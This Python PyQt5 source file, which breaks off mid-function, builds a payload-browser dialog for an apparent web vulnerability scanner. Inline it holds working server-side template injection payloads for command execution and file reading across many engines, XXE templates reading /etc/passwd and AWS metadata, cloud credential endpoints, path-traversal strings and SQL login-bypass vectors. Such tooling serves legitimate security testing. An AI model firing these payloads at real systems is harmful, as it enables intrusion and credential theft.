"""
Payloads Browser Dialog — shows all payloads used by each scan type.

Opens via the "Payloads" button in the Scanner toolbar.  Shows a two-pane
layout:
  Left  — list of scan types
  Right — tabbed payload tables for the selected scan type

Each table row includes the payload itself plus useful context (engine,
technique, expected result, notes) so testers can understand what a payload
does without leaving the tool.
"""

import json
from typing import Any, Dict, List, Tuple, Optional

from PyQt5.QtWidgets import (
    QWidget, QVBoxLayout, QHBoxLayout, QSplitter, QListWidget, QListWidgetItem,
    QTabWidget, QTableWidget, QTableWidgetItem, QHeaderView,
    QLabel, QPushButton, QLineEdit, QTextEdit, QFrame, QAbstractItemView,
    QDialogButtonBox, QSizePolicy,
)
from PyQt5.QtCore import Qt, QSize
from PyQt5.QtGui import QFont, QColor, QBrush, QIcon

# ─── Import payload constants from scan modules ────────────────────────────
try:
    from scans.ssti_scan import (
        _PROBE_PAYLOADS, _FINGERPRINT_PAYLOADS,
        _ERROR_PROBES, _ERROR_PATTERNS,
    )
except ImportError:
    _PROBE_PAYLOADS = _FINGERPRINT_PAYLOADS = _ERROR_PROBES = _ERROR_PATTERNS = []

try:
    from scans.nosqli_scan import (
        _NOSQLI_FUZZ_STRINGS, _NOSQLI_SINGLE_CHAR_PROBES,
        _NOSQLI_BOOLEAN_PROBES, _NOSQLI_OPERATOR_PARAMS,
        _NOSQLI_AUTH_BYPASS_JSON, _NOSQLI_LOGICAL_OPERATORS,
        _NOSQLI_WHERE_PAYLOADS, _NOSQLI_TIMING_PAYLOADS,
        _NOSQLI_REGEX_EXTRACT_PROBES, _NOSQLI_RCE_PAYLOADS,
        _NOSQLI_ERROR_PATTERNS,
    )
except ImportError:
    _NOSQLI_FUZZ_STRINGS = _NOSQLI_SINGLE_CHAR_PROBES = []
    _NOSQLI_BOOLEAN_PROBES = _NOSQLI_OPERATOR_PARAMS = []
    _NOSQLI_AUTH_BYPASS_JSON = _NOSQLI_LOGICAL_OPERATORS = []
    _NOSQLI_WHERE_PAYLOADS = _NOSQLI_TIMING_PAYLOADS = []
    _NOSQLI_REGEX_EXTRACT_PROBES = _NOSQLI_RCE_PAYLOADS = []
    _NOSQLI_ERROR_PATTERNS = []

try:
    from scans.open_redirect_scan import _BASIC_PAYLOADS as _REDIR_PAYLOADS
except ImportError:
    _REDIR_PAYLOADS = []

try:
    from scans.xss_scan import CHAR_PROBES, KEYWORD_PROBES, XssScanMixin
    _XSS_BUILTIN = XssScanMixin._BUILTIN_PAYLOADS
except ImportError:
    CHAR_PROBES = KEYWORD_PROBES = _XSS_BUILTIN = []

try:
    from scans.cors_scan import CorsScanMixin
    _CORS_PROBES = CorsScanMixin._CORS_PROBES
except ImportError:
    _CORS_PROBES = []

try:
    from scans.ssrf_scan import (
        _LOOPBACK_HOSTS, _BYPASS_LOOPBACK, _ADMIN_PATHS,
        _CLOUD_METADATA, _PROTOCOL_PAYLOADS, _BYPASS_LOOPBACK_RAW_URLS,
        _SSRF_HEADERS,
    )
except ImportError:
    _LOOPBACK_HOSTS = _BYPASS_LOOPBACK = _ADMIN_PATHS = []
    _CLOUD_METADATA = _PROTOCOL_PAYLOADS = _BYPASS_LOOPBACK_RAW_URLS = []
    _SSRF_HEADERS = []

try:
    from scans.xxe_scan import _LFI_UNIX, _LFI_WIN, _SSRF_TARGETS, _LOCAL_DTDS, _SOAP_PATHS
except ImportError:
    _LFI_UNIX = _LFI_WIN = _SSRF_TARGETS = _LOCAL_DTDS = _SOAP_PATHS = []

try:
    from scans.sqli_scan import _SQLI_PAYLOADS
except ImportError:
    _SQLI_PAYLOADS = {}

try:
    from scans.cmdi_scan import (
        _CMDI_OUTPUT_SIGNATURES,
        _CMDI_SEPARATOR_PAYLOADS,
        _CMDI_TIME_PAYLOADS,
    )
except ImportError:
    _CMDI_OUTPUT_SIGNATURES = _CMDI_SEPARATOR_PAYLOADS = _CMDI_TIME_PAYLOADS = []

# ─────────────────────────────────────────────────────────────────────────────
# Colour palette (mirrors constants.py)
# ─────────────────────────────────────────────────────────────────────────────
_BG_DARK      = "#1e1e1e"
_BG_MED       = "#252526"
_BG_ROW_ALT   = "#2a2a2a"
_BG_SELECTED  = "#094771"
_TEXT_PRIMARY  = "#d4d4d4"
_TEXT_MUTED   = "#858585"
_TEXT_BRIGHT  = "#ffffff"
_ACCENT_BLUE  = "#007acc"
_ACCENT_GREEN = "#4ec9b0"
_ACCENT_GOLD  = "#dcdcaa"
_ACCENT_RED   = "#f44747"
_BORDER       = "#3c3c3c"

_QSS_TABLE = f"""
    QTableWidget {{
        background-color: {_BG_DARK};
        color: {_TEXT_PRIMARY};
        gridline-color: {_BORDER};
        border: none;
        font-size: 12px;
    }}
    QTableWidget::item {{
        padding: 4px 6px;
        border: none;
    }}
    QTableWidget::item:selected {{
        background-color: {_BG_SELECTED};
        color: {_TEXT_BRIGHT};
    }}
    QHeaderView::section {{
        background-color: {_BG_MED};
        color: {_TEXT_BRIGHT};
        padding: 4px 6px;
        border: 1px solid {_BORDER};
        font-weight: bold;
        font-size: 11px;
    }}
"""

_QSS_SEARCH = f"""
    QLineEdit {{
        background-color: {_BG_MED};
        color: {_TEXT_PRIMARY};
        border: 1px solid {_BORDER};
        border-radius: 3px;
        padding: 4px 8px;
        font-size: 12px;
    }}
    QLineEdit:focus {{
        border-color: {_ACCENT_BLUE};
    }}
"""

_QSS_DETAIL = f"""
    QTextEdit {{
        background-color: {_BG_MED};
        color: {_TEXT_PRIMARY};
        border: 1px solid {_BORDER};
        font-family: monospace;
        font-size: 11px;
    }}
"""

_QSS_BTN = f"""
    QPushButton {{
        background-color: #3a3a3a;
        color: {_TEXT_BRIGHT};
        border: 1px solid {_BORDER};
        border-radius: 4px;
        padding: 5px 12px;
        font-size: 12px;
    }}
    QPushButton:hover {{ background-color: #505050; }}
    QPushButton:pressed {{ background-color: #2a2a2a; }}
"""

_QSS_LIST = f"""
    QListWidget {{
        background-color: {_BG_MED};
        color: {_TEXT_PRIMARY};
        border: 1px solid {_BORDER};
        font-size: 13px;
    }}
    QListWidget::item {{
        padding: 8px 10px;
    }}
    QListWidget::item:selected {{
        background-color: {_BG_SELECTED};
        color: {_TEXT_BRIGHT};
        font-weight: bold;
    }}
    QListWidget::item:hover {{
        background-color: #333333;
    }}
"""

_QSS_TABS = f"""
    QTabWidget::pane {{
        border: 1px solid {_BORDER};
        background-color: {_BG_DARK};
    }}
    QTabBar::tab {{
        background-color: {_BG_MED};
        color: {_TEXT_MUTED};
        padding: 6px 14px;
        border: 1px solid {_BORDER};
        border-bottom: none;
        margin-right: 2px;
        font-size: 11px;
    }}
    QTabBar::tab:selected {{
        background-color: {_BG_DARK};
        color: {_TEXT_BRIGHT};
        font-weight: bold;
    }}
    QTabBar::tab:hover {{
        background-color: #3a3a3a;
        color: {_TEXT_BRIGHT};
    }}
"""


# ─────────────────────────────────────────────────────────────────────────────
# Helpers to build table widgets
# ─────────────────────────────────────────────────────────────────────────────

def _make_table(headers: List[str], rows: List[List[str]]) -> QTableWidget:
    """Create a read-only styled QTableWidget."""
    tbl = QTableWidget(len(rows), len(headers))
    tbl.setHorizontalHeaderLabels(headers)
    tbl.setStyleSheet(_QSS_TABLE)
    tbl.setEditTriggers(QAbstractItemView.NoEditTriggers)
    tbl.setSelectionBehavior(QAbstractItemView.SelectRows)
    tbl.setAlternatingRowColors(True)
    tbl.verticalHeader().setVisible(False)
    tbl.horizontalHeader().setStretchLastSection(True)
    tbl.setWordWrap(True)
    palette = tbl.palette()
    palette.setColor(palette.AlternateBase, QColor(_BG_ROW_ALT))
    tbl.setPalette(palette)

    mono = QFont("Monospace", 10)
    mono.setStyleHint(QFont.TypeWriter)

    for r, row_data in enumerate(rows):
        max_height = 1
        for c, cell in enumerate(row_data):
            item = QTableWidgetItem(str(cell))
            item.setFlags(Qt.ItemIsSelectable | Qt.ItemIsEnabled)
            # Payload columns use a monospace font
            if headers[c] in ("Payload", "Probe", "Value", "Pattern", "Command",
                              "Separator", "Path/URL", "Template", "Signature"):
                item.setFont(mono)
                item.setForeground(QBrush(QColor(_ACCENT_GREEN)))
            tbl.setItem(r, c, item)
            lines = str(cell).count("\n") + 1
            if lines > max_height:
                max_height = lines
        tbl.setRowHeight(r, max(28, max_height * 18))

    tbl.resizeColumnsToContents()
    hdr = tbl.horizontalHeader()
    hdr.setSectionResizeMode(QHeaderView.Interactive)
    # Give the last column stretch
    hdr.setStretchLastSection(True)
    return tbl


def _make_tab_widget(sections: List[Tuple[str, List[str], List[List[str]]]]) -> QTabWidget:
    """
    sections: list of (tab_label, column_headers, rows)
    Returns a QTabWidget with one tab per section.
    """
    tabs = QTabWidget()
    tabs.setStyleSheet(_QSS_TABS)
    for tab_label, col_headers, rows in sections:
        tbl = _make_table(col_headers, rows)
        tab = QWidget()
        lay = QVBoxLayout(tab)
        lay.setContentsMargins(0, 0, 0, 0)
        count_lbl = QLabel(f"  {len(rows)} payload(s)")
        count_lbl.setStyleSheet(f"color: {_TEXT_MUTED}; font-size: 10px; padding: 2px;")
        lay.addWidget(count_lbl)
        lay.addWidget(tbl)
        tabs.addTab(tab, f"{tab_label} ({len(rows)})")
    return tabs


def _make_plain_tab(text: str) -> QWidget:
    """Tab showing a monospace text block."""
    w = QWidget()
    lay = QVBoxLayout(w)
    lay.setContentsMargins(4, 4, 4, 4)
    te = QTextEdit()
    te.setReadOnly(True)
    te.setStyleSheet(_QSS_DETAIL)
    te.setPlainText(text)
    lay.addWidget(te)
    return w


# ─────────────────────────────────────────────────────────────────────────────
# Per-scan payload builders
# ─────────────────────────────────────────────────────────────────────────────

def _build_ssti() -> QTabWidget:
    probe_rows = [
        [lbl, payload, expected, engines]
        for lbl, payload, expected, engines in _PROBE_PAYLOADS
    ]
    fp_rows = [
        [lbl, payload, expected, engine,
         _SSTI_EXPLOITATION.get(engine, "See: https://portswigger.net/web-security/server-side-template-injection")]
        for lbl, payload, expected, engine in _FINGERPRINT_PAYLOADS
    ]
    err_probe_rows = [
        [str(i+1), probe, _PROBE_DESCRIPTION.get(probe, "Triggers syntax errors in most engines")]
        for i, probe in enumerate(_ERROR_PROBES)
    ]
    err_pat_rows = [
        [pattern, engine,
         _SSTI_EXPLOITATION.get(engine, "See: https://portswigger.net/web-security/server-side-template-injection")]
        for pattern, engine in _ERROR_PATTERNS
    ]
    sections = [
        ("Phase 1 – Math Probes",
         ["Label", "Payload", "Expected", "Engines"],
         probe_rows),
        ("Phase 2 – Fingerprint",
         ["Label", "Payload", "Expected", "Engine", "Exploitation Guidance"],
         fp_rows),
        ("Phase 3 – Error Probes",
         ["#", "Probe", "Notes"],
         err_probe_rows),
        ("Phase 3 – Error Patterns",
         ["Pattern (regex)", "Engine", "Exploitation Guidance"],
         err_pat_rows),
    ]
    return _make_tab_widget(sections)


_PROBE_DESCRIPTION = {
    "${{<%[%'\"}}%\\": "Classic tplmap polyglot — triggers most template engines",
    "${7/0}":          "Division by zero — Freemarker, Spring EL, Mako",
    "{{7/0}}":         "Division by zero — Jinja2, Twig, Nunjucks",
    "#{7/0}":          "Division by zero — Thymeleaf, EL",
    "@(1/0)":          "Division by zero — Razor / .NET",
}

# ── Exploitation guidance per engine ─────────────────────────────────────────
_SSTI_EXPLOITATION: dict = {
    # Format: "• {label:<19}{payload}"  — all payloads start at column 21
    # Continuation lines are indented by 21 spaces.
    "Jinja2": (
        "• RCE:               {{ config.__class__.__init__.__globals__['os'].popen('id').read() }}\n"
        "                     {{ ''.__class__.__mro__[1].__subclasses__()[439]('id',shell=True,stdout=-1).communicate()[0] }}\n"
        "• File read:         {{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}\n"
        "• Ref:               https://portswigger.net/web-security/server-side-template-injection"
    ),
    "Twig": (
        "• RCE:               {{['id']|filter('system')}}\n"
        "                     {{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}\n"
        "• File read:         {{'/etc/passwd'|file_excerpt(1,30)}}\n"
        "• Ref:               https://portswigger.net/web-security/server-side-template-injection"
    ),
    "ERB": (
        "• RCE:               <%= `id` %>\n"
        "                     <%= system('id') %>\n"
        "• File read:         <%= File.open('/etc/passwd').read %>\n"
        "• Dir list:          <%= Dir.entries('/') %>\n"
        "• Ref:               https://portswigger.net/web-security/server-side-template-injection"
    ),
    "Freemarker/EL": (
        "• RCE:               ${'freemarker.template.utility.Execute'?new()('id')}\n"
        "                     <#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex('id')}\n"
        "• File read:         ${\"freemarker.template.utility.ObjectConstructor\"?new()(\"java.io.FileReader\",\"/etc/passwd\")}\n"
        "• Ref:               https://portswigger.net/web-security/server-side-template-injection"
    ),
    "Freemarker": (
        "• RCE:               ${'freemarker.template.utility.Execute'?new()('id')}\n"
        "                     <#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex('id')}\n"
        "• File read:         ${\"freemarker.template.utility.ObjectConstructor\"?new()(\"java.io.FileReader\",\"/etc/passwd\")}\n"
        "• Ref:               https://portswigger.net/web-security/server-side-template-injection"
    ),
    "Thymeleaf": (
        "• RCE:               [[${T(java.lang.Runtime).getRuntime().exec('id')}]]\n"
        "                     ${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}\n"
        "• File read:         [[${T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get('/etc/passwd'))}]]\n"
        "• Ref:               https://portswigger.net/web-security/server-side-template-injection"
    ),
    "Spring Thymeleaf": (
        "• RCE:               *{T(java.lang.Runtime).getRuntime().exec('id')}\n"
        "                     *{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}\n"
        "• Ref:               https://portswigger.net/web-security/server-side-template-injection"
    ),
    "Smarty": (
        "• RCE:               {system('id')}\n"
        "                     {$smarty.template_object->smarty->registerPlugin('modifier','x','system')}{'id'|x}\n"
        "• File read:         {file_get_contents('/etc/passwd')}\n"
        "• Ref:               https://portswigger.net/web-security/server-side-template-injection"
    ),
    "Pebble": (
        "• RCE:               {% set cmd = 'id' %}{%set exec = 'freemarker.template.utility.Execute'|new()%}{{exec.exec(cmd)}}\n"
        "                     {{variable.getClass().forName('java.lang.Runtime').getMethod('exec',...).invoke(...)}}\n"
        "• Ref:               https://portswigger.net/web-security/server-side-template-injection"
    ),
    "Razor/.NET": (
        "• RCE:               @System.Diagnostics.Process.Start(\"cmd.exe\",\"/c id\")\n"
        "                     @{ var x = new System.Diagnostics.ProcessStartInfo(\"id\"); }\n"
        "• File read:         @System.IO.File.ReadAllText(\"C:\\\\Windows\\\\win.ini\")\n"
        "• Ref:               https://portswigger.net/web-security/server-side-template-injection"
    ),
    "Velocity": (
        "• RCE:               #set($rt=$class.forName('java.lang.Runtime').getRuntime())\n"
        "                     #set($proc=$rt.exec('id'))\n"
        "                     #set($out=$proc.getInputStream())\n"
        "• File read:         #set($f=$class.forName('java.io.FileInputStream').getDeclaredConstructors()[0])\n"
        "• Ref:               https://portswigger.net/web-security/server-side-template-injection"
    ),
    "JsRender": (
        "• RCE:               {{:constructor.constructor('return process.env')()}}\n"
        "                     {{:constructor.constructor('return require(\"child_process\").execSync(\"id\").toString()')()}}\n"
        "• Ref:               https://portswigger.net/web-security/server-side-template-injection"
    ),
    "Jinjava/HuBL": (
        "• RCE:               {{''.class.forName('java.lang.Runtime').getDeclaredMethods()[15]\n"
        "                     .invoke(''.class.forName('java.lang.Runtime').getDeclaredMethods()[7].invoke(null),'id')}}\n"
        "• Ref:               https://portswigger.net/research/server-side-template-injection"
    ),
    "Mako": (
        "• RCE:               ${__import__('os').popen('id').read()}\n"
        "• File read:         ${open('/etc/passwd').read()}\n"
        "• Ref:               https://portswigger.net/web-security/server-side-template-injection"
    ),
    "Tornado": (
        "• RCE:               {% import os %}{{os.popen('id').read()}}\n"
        "• File read:         {% import os %}{{open('/etc/passwd').read()}}\n"
        "• Ref:               https://portswigger.net/web-security/server-side-template-injection"
    ),
    "Nunjucks": (
        "• RCE:               {{range.constructor(\"return global.process.mainModule.require('child_process').execSync('id').toString()\")()}}\n"
        "• Ref:               https://portswigger.net/web-security/server-side-template-injection"
    ),
    "EJS": (
        "• RCE:               <%- global.process.mainModule.require('child_process').execSync('id') %>\n"
        "• Ref:               https://portswigger.net/web-security/server-side-template-injection"
    ),
    "Handlebars": (
        "• RCE:               {{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}\n"
        "                     {{this.pop}}{{this.push (lookup string.sub \"constructor\")}}\n"
        "                     {{this.pop}}{{#with string.split as |codelist|}}\n"
        "                     {{this.pop}}{{this.push \"return require('child_process').execSync('id');\"}}\n"
        "                     {{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}\n"
        "                     {{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}\n"
        "• Ref:               https://portswigger.net/web-security/server-side-template-injection"
    ),
    "Groovy": (
        "• RCE:               ${'id'.execute().text}\n"
        "                     ${['bash','-c','id'].execute().text}\n"
        "• Ref:               https://portswigger.net/web-security/server-side-template-injection"
    ),
    "Pug/Jade": (
        "• RCE:               #{function(){localLoad=global.process.mainModule.constructor._resolveFilename;\n"
        "                     localLoad('child_process').execSync('id').toString()}()}\n"
        "• Ref:               https://portswigger.net/web-security/server-side-template-injection"
    ),
    "Go/text-template": (
        "• RCE:               {{.}} (dumps context)\n"
        "                     {{$x := .Exec \"id\"}}{{$x}} (if Exec is exposed in data)\n"
        "• Note:              Go templates sandbox most OS calls unless explicitly exposed\n"
        "• Ref:               https://portswigger.net/web-security/server-side-template-injection"
    ),
    "Liquid": (
        "• Note:              Liquid is sandboxed by design — no direct RCE via template syntax.\n"
        "                     Look for server-side config that exposes custom Liquid tags/filters.\n"
        "• Ref:               https://portswigger.net/web-security/server-side-template-injection"
    ),
    "Generic": (
        "• Note:              Identify engine via error messages, then use engine-specific RCE payload.\n"
        "• Ref:               https://portswigger.net/web-security/server-side-template-injection"
    ),
    "Java-EL": (
        "• RCE:               ${Runtime.getRuntime().exec('id')}\n"
        "                     ${pageContext.request.getSession().setAttribute('x',\n"
        "                     pageContext.request.getClass().forName('java.lang.Runtime')\n"
        "                     .getMethod('exec',String.class).invoke(\n"
        "                     pageContext.request.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id'))}\n"
        "• Ref:               https://portswigger.net/web-security/server-side-template-injection"
    ),
}


def _build_sqli() -> QTabWidget:
    tabs = QTabWidget()
    tabs.setStyleSheet(_QSS_TABS)

    _CATEGORY_NOTES = {
        "error_based": (
            "Inject syntax that causes the database to raise a parse or execution error.\n"
            "Database-specific functions like EXTRACTVALUE (MySQL), CAST…AS INTEGER (PgSQL),\n"
            "CONVERT(INT,…) (MSSQL) leak version / user info into the error message."
        ),
        "boolean_based": (
            "Inject conditional expressions that change the application response depending on\n"
            "whether the injected condition is TRUE or FALSE. Compare the two responses to\n"
            "infer data without any visible error output."
        ),
        "time_based": (
            "Inject a sleep or heavy computation into the query. If the response is delayed\n"
            "by the expected amount, the field is injectable.\n\n"
            "• SLEEP(N) — MySQL\n"
            "• pg_sleep(N) — PostgreSQL\n"
            "• WAITFOR DELAY '00:00:N' — MSSQL\n"
            "• DBMS_PIPE.RECEIVE_MESSAGE — Oracle"
        ),
        "union_based": (
            "Append a UNION SELECT to retrieve data from other tables.\n"
            "First probe for the number of columns using NULL placeholders,\n"
            "then substitute a column with a version/user expression."
        ),
        "auth_bypass": (
            "Classic authentication bypass vectors:\n"
            "• Admin comment trick: admin'-- (comments out password check)\n"
            "• OR-true: ' OR 1=1-- (always true condition)\n"
            "• String comparison bypass: ' OR 'x'='x"
        ),
        "login_sqli": (
            "Compact set used specifically for login forms (fewer payloads = lower lockout risk).\n"
            "Covers syntax probes, OR-true bypass, common username tricks, and one time probe."
        ),
        "conditional_error": (
            "CASE WHEN (condition) THEN 1/0 ELSE 'a' END\n"
            "True condition  → division by zero → HTTP 500 / error page\n"
            "False condition → 'a' returned   → HTTP 200 / normal page\n"
            "Use this to extract data one bit at a time."
        ),
        "verbose_error": (
            "Force the database to include sensitive data inside an error message:\n"
            "• MySQL  : EXTRACTVALUE / UPDATEXML\n"
            "• PgSQL  : CAST((SELECT …) AS INTEGER)\n"
            "• MSSQL  : CONVERT(INT, …)"
        ),
        "oast": (
            "Out-of-Band (DNS/HTTP) payloads that trigger an outbound request.\n"
            "{OAST_DOMAIN} is replaced at runtime with the interactsh callback URL.\n"
            "Useful when the application gives no visible error or response difference."
        ),
    }

    for category, payloads in _SQLI_PAYLOADS.items():
        rows = [[k, v] for k, v in payloads.items()]
        tab = QWidget()
        lay = QVBoxLayout(tab)
        lay.setContentsMargins(4, 4, 4, 4)
        lay.setSpacing(4)

        note = _CATEGORY_NOTES.get(category, "")
        if note:
            note_lbl = QLabel(note)
            note_lbl.setStyleSheet(
                f"color: {_TEXT_MUTED}; font-size: 10px; padding: 2px 4px;"
            )
            note_lbl.setWordWrap(True)
            lay.addWidget(note_lbl)

        count_lbl = QLabel(f"  {len(rows)} payload(s)")
        count_lbl.setStyleSheet(f"color: {_TEXT_MUTED}; font-size: 10px;")
        lay.addWidget(count_lbl)

        tbl = _make_table(["Key", "Payload"], rows)
        lay.addWidget(tbl)
        label = category.replace("_", " ").title()
        tabs.addTab(tab, f"{label} ({len(rows)})")

    return tabs


def _build_xss() -> QTabWidget:
    char_rows  = [[c, f"Tests if '{c}' passes WAF / sanitiser unchanged"] for c in CHAR_PROBES]
    kw_rows    = [[k, "Keyword blocked/stripped detection probe"] for k in KEYWORD_PROBES]
    builtin_rows = [[str(i+1), p] for i, p in enumerate(_XSS_BUILTIN)]

    sections = [
        ("Char Probes",
         ["Character", "Purpose"],
         char_rows),
        ("Keyword Probes",
         ["Keyword", "Purpose"],
         kw_rows),
        ("Builtin Payloads",
         ["#", "Payload"],
         builtin_rows),
    ]
    return _make_tab_widget(sections)


def _build_cmdi() -> QTabWidget:
    sig_rows = [
        [pattern, desc, platform]
        for pattern, desc, platform in _CMDI_OUTPUT_SIGNATURES
    ]
    sep_rows = [
        [name, sep if "{CMD}" not in sep else sep, platform]
        for name, sep, platform in _CMDI_SEPARATOR_PAYLOADS
    ]
    time_rows = [
        [name, payload, str(delay) + "s", platform]
        for name, payload, delay, platform in _CMDI_TIME_PAYLOADS
    ]
    sections = [
        ("Output Signatures",
         ["Pattern (regex)", "Description", "Platform"],
         sig_rows),
        ("Separators",
         ["Name", "Separator / Template", "Platform"],
         sep_rows),
        ("Time-Based Blind",
         ["Name", "Payload", "Expected Delay", "Platform"],
         time_rows),
    ]
    return _make_tab_widget(sections)


def _build_lfi() -> QTabWidget:
    # LFI uses a SecLists wordlist (LFI-Jhaddix.txt), so we show path examples
    unix_rows = [[p, "Unix"] for p in _LFI_UNIX]
    win_rows  = [[p, "Windows"] for p in _LFI_WIN]
    all_rows  = unix_rows + win_rows

    sigs = [
        "root:x:0:0",
        "root:*:0:0",
        "/bin/bash",
        "/bin/sh",
        "nobody:x:",
        "multi(0)disk(0)rdisk(0)partition(1)\\WINDOWS",
        "[boot loader]",
        "[fonts]",
        "AccessFileName",
        "RewriteEngine",
        "DirectoryIndex",
        "AuthUserFile",
    ]
    sig_rows = [[s, _LFI_SIG_NOTES.get(s, "File content signature")] for s in sigs]

    sections = [
        ("Probe Paths (examples)",
         ["Path/URL", "Platform"],
         all_rows),
        ("Detection Signatures",
         ["Signature", "Notes"],
         sig_rows),
    ]
    tabs = _make_tab_widget(sections)

    # Add a note tab about the wordlist
    note_text = (
        "LFI scan uses the SecLists wordlist:\n"
        "  <seclists_dir>/Fuzzing/LFI/LFI-Jhaddix.txt\n\n"
        "Configure 'seclists_dir' in:\n"
        "  Hunt GUI → Tools → Settings → Seclists Directory\n\n"
        "The wordlist typically contains 900+ path traversal payloads\n"
        "including deep traversal sequences, URL-encoded variants, and\n"
        "null-byte suffixes.\n\n"
        "Common path traversal sequences:\n"
        "  ../../../etc/passwd\n"
        "  ....//....//etc/passwd\n"
        "  ..%2F..%2F..%2Fetc%2Fpasswd\n"
        "  ..%252F..%252Fetc%252Fpasswd\n"
        "  /etc/passwd%00\n"
        "  /proc/self/environ\n"
        "  /var/log/apache2/access.log\n"
    )
    note_tab = _make_plain_tab(note_text)
    tabs.addTab(note_tab, "Wordlist Info")
    return tabs


_LFI_SIG_NOTES = {
    "root:x:0:0":   "/etc/passwd — Unix root entry",
    "root:*:0:0":   "/etc/passwd — BSD root entry",
    "/bin/bash":    "/etc/passwd — shell field",
    "/bin/sh":      "/etc/passwd — shell field",
    "nobody:x:":    "/etc/passwd — nobody account",
    "multi(0)disk(0)rdisk(0)partition(1)\\WINDOWS": "boot.ini (Windows)",
    "[boot loader]":"boot.ini section header",
    "[fonts]":       "win.ini [fonts] section",
    "AccessFileName":"Apache .htaccess config line",
    "RewriteEngine": "Apache .htaccess rewrite rule",
    "DirectoryIndex":"Apache httpd.conf directive",
    "AuthUserFile":  "Apache auth config directive",
}


def _build_ssrf() -> QTabWidget:
    loop_rows  = [[h, "Loopback / localhost alias"] for h in _LOOPBACK_HOSTS]
    byp_rows   = [[p, "Loopback bypass technique"] for p in _BYPASS_LOOPBACK]
    raw_rows   = [[p, "Raw loopback URL bypass"] for p in _BYPASS_LOOPBACK_RAW_URLS]
    admin_rows = [[p, "Internal admin panel path"] for p in _ADMIN_PATHS]
    cloud_rows = [
        [url, _CLOUD_NOTES.get(url, "Cloud metadata endpoint")]
        for url in _CLOUD_METADATA
    ]
    proto_rows = [
        [item if isinstance(item, str) else str(item),
         "Protocol-level SSRF vector"]
        for item in _PROTOCOL_PAYLOADS
    ]
    hdr_rows   = [[h, "Header that may influence server-side requests"] for h in _SSRF_HEADERS]

    sections = [
        ("Loopback Hosts",     ["Host/IP",   "Notes"],     loop_rows),
        ("Blacklist Bypasses",  ["Payload",   "Notes"],     byp_rows),
        ("Raw URL Bypasses",   ["URL",        "Notes"],     raw_rows),
        ("Admin Paths",        ["Path",       "Notes"],     admin_rows),
        ("Cloud Metadata",     ["URL",        "Notes"],     cloud_rows),
        ("Protocol Payloads",  ["Payload",    "Notes"],     proto_rows),
        ("SSRF Headers",       ["Header",     "Notes"],     hdr_rows),
    ]
    return _make_tab_widget(sections)


_CLOUD_NOTES = {
    "http://169.254.169.254/latest/meta-data/": "AWS Instance Metadata Service (IMDSv1)",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/": "AWS IAM credentials",
    "http://169.254.169.254/latest/user-data": "AWS user-data (bootstrap scripts)",
    "http://metadata.google.internal/computeMetadata/v1/": "GCP metadata (needs Metadata-Flavor header)",
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01": "Azure IMDS",
}


def _build_xxe() -> QTabWidget:
    lfi_rows = [[p, "Unix"] for p in _LFI_UNIX] + [[p, "Windows"] for p in _LFI_WIN]
    ssrf_rows = [[u, "Internal SSRF via XXE"] for u in _SSRF_TARGETS]
    dtd_rows  = [[path, param, "Local DTD repurposing (no OOB needed)"]
                 for path, param in _LOCAL_DTDS]
    soap_rows = [[p, "SOAP / XML-RPC path probe"] for p in _SOAP_PATHS]

    template_rows = [
        ["Classic file read",
         '<?xml version="1.0"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n]>\n<foo>&xxe;</foo>',
         "Works when the parser returns entity value",
        ],
        ["XXE → SSRF",
         '<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">\n]>\n<foo>&xxe;</foo>',
         "Triggers outbound request",
        ],
        ["Blind OOB (regular entity)",
         '<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "http://INTERACTSH_HOST/">\n]>\n<foo>&xxe;</foo>',
         "No output — use OOB callback (interactsh)",
        ],
        ["Blind OOB (parameter entity)",
         '<!DOCTYPE foo [\n  <!ENTITY % xxe SYSTEM "http://INTERACTSH_HOST/">\n  %xxe;\n]>',
         "Parameter entity form",
        ],
        ["Error-based",
         '<!DOCTYPE foo [\n  <!ENTITY % xxe SYSTEM "file:///etc/passwd">\n  <!ENTITY % error "<!ENTITY &#x25; foo SYSTEM \'%xxe;\'>">\n  %error;\n]>',
         "File content in parser error",
        ],
        ["XInclude",
         '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>',
         "No DOCTYPE control needed",
        ],
    ]

    sections = [
        ("LFI Target Paths",  ["Path",    "Platform"],               lfi_rows),
        ("SSRF Targets",      ["URL",     "Notes"],                  ssrf_rows),
        ("Local DTDs",        ["DTD Path","Parameter","Notes"],       dtd_rows),
        ("SOAP Paths",        ["Path",    "Notes"],                  soap_rows),
        ("Template Payloads", ["Technique","Payload","Notes"],        template_rows),
    ]
    return _make_tab_widget(sections)


def _build_nosqli() -> QTabWidget:
    fuzz_rows  = [[p, "NoSQL fuzz string"] for p in _NOSQLI_FUZZ_STRINGS]
    char_rows  = [[c, "Single-char probe"] for c in _NOSQLI_SINGLE_CHAR_PROBES]
    bool_rows  = [[p, cond, "Boolean-blind probe"] for p, cond in _NOSQLI_BOOLEAN_PROBES]
    op_rows    = [[suf, val, "URL bracket notation operator"] for suf, val in _NOSQLI_OPERATOR_PARAMS]
    auth_rows  = [[json.dumps(obj), "Auth bypass via JSON operator injection"]
                  for obj in _NOSQLI_AUTH_BYPASS_JSON]
    logic_rows = [[p, "Logical operator injection"] for p in _NOSQLI_LOGICAL_OPERATORS]
    where_rows = [[p, cond, "$where JS injection"] for p, cond in _NOSQLI_WHERE_PAYLOADS]
    time_rows  = [[p, f"{delay}s expected", "Timing blind"] for p, delay in _NOSQLI_TIMING_PAYLOADS]
